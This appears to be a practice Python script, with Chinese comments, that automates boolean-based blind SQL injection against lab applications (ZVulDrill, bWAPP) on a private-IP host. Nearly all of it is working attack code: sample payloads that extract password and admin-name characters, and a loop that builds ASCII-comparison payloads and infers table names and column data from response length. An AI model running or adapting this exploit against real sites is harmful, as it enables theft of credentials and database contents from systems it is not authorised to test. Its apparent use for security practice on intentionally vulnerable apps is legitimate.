
# 盲注第一个字符
# id=0 or if((select ascii(substr((select password from user limit 0,1),1,1))>111),1,0)
# 盲注第二个字符
# id=0 or if((select ascii(substr((select password from user limit 0,1),2,1))>118),1,0)
# 盲注第三个字符
# id=0 or if((select ascii(substr((select password from user limit 0,1),3,1))>99),1,0)
# 盲注第四个字符
# id=0 or if((select ascii(substr((select password from user limit 0,1),4,1))>48),1,0)
# 盲注第五个字符
# id=0 or if((select ascii(substr((select password from user limit 0,1),5,1))=0),1,0)
# 返回正常 第五个字符ascii为0--对应为null---说明第一行的password值已经全部注入出来

#http://172.30.61.112/ZVulDrill-master/search.php?search=1'or if((select ascii(substr((select admin_name from admin limit 0,1),1,1))=97),1,0)%23
#http://172.30.61.112/ZVulDrill-master/search.php?search=1'or if((select ascii(substr((select comment_text from comment limit 0,1),1,1))=49),1,0)%23

import urllib
from urllib import request
from data import glovar, glofun


def get_tbname(url=glovar.url3, cookie=False, type='search',
                    tbname='comment', coname='comment_text',rowcount=1):

    response_length = 0

    single_data = ""

    tbname_list = []


    if type == 'int':
        payload = '+or+if((select+ascii(substr((select+table_name+from+information_schema.tables+where+table_schema=' + tbname + '+limit+{tbname_order_number},1),{tbname_str_location},1))={ascii_number}),1,0)'
    elif type == 'string':
        payload = '\'+or+if((select+ascii(substr((select+table_name+from+information_schema.tables+where+table_schema=' + tbname + '+limit+{tbname_order_number},1),{tbname_str_location},1))={ascii_number}),1,0)%23'
    elif type == 'search':
        payload = '%\'+or+if((select+ascii(substr((select+'+ coname +'+from+' + tbname + '+limit+{data_row_order},1),{data_location},1))={ascii_number}),1,0)%23'

    payloads = ["0", "95", "97", "98", "99", "100", "101", "102", "103", "104", "105", "106", "107", "108", "109",
                "110", "111", "112", "113", "114", "115", "116", "117", "118", "119", "120", "121", "122",
                "48", "49", "50", "51", "52", "53", "54", "55", "56", "57"]

    # _ 95    NULL 0

    for i in range(0, rowcount):

        for k in range(1, 35):

            for j in payloads:

                full_payload = url + payload.format(data_row_order=str(i), data_location=str(k),
                                                    ascii_number=str(j))

                url_read=glofun.url_request(full_payload,cookie)

                url_read_length = len(url_read)

                if (url_read_length - response_length) > 50:

                    response_length = url_read_length  # 与之前的包大小相差很大，所以取较大的返回包大小为正确的返回包

                    single_data = chr(int(j))

                    print(single_data)

                elif (response_length - url_read_length) < 50:  # 如果返回包的长度等于或者在比之前包只小了100之内，则是正确的包

                    # 如果返回了0，说明返回的是NULL,到了表名字的结果，跳出，寻找下一个表
                    if k != 1:
                        if j == '0':
                            tbname_list.append(single_data)

                            print(single_data)

                            single_data = ""

                            break

                    single_data += chr(int(j))

                    print(single_data)

            # 跳出多重循环
            else:

                continue

            break

    print(tbname_list)

def get_dbname_test2(cookie=glovar.cookie):

    response_length = 0

    hex_dbname = ""

    tbname = ""

    tbname_list = []


#    full_payload = 'http://172.30.61.112/bWAPP/bWAPP/sqli_2.php?\'action=go&movie=100+or+if((select+ascii(substr((select+table_name+from+information_schema.tables+where+table_schema=0x6277617070+limit+0,1),1,1))=98),1,0)'
    full_payload='http://172.30.61.112/ZVulDrill-master/search.php?search=1\'+or+if((select+ascii(substr((select+admin_name+from+admin+limit+0,1),1,1))=97),1,0)%23'

    print(full_payload)

    url_response = urllib.request.Request(full_payload)


    #url_response.add_header('Cookie', cookie)

    url_read = request.urlopen(url_response).read()

    url_read_length = len(url_read)

    print(url_read_length)




if __name__ == "__main__":

    get_tbname(url=glovar.url3)

    #get_dbname(glovar.url4, cookie=glovar.cookie, type='int', dbname='bwapp',tbcount=5)

    #get_dbname_test2()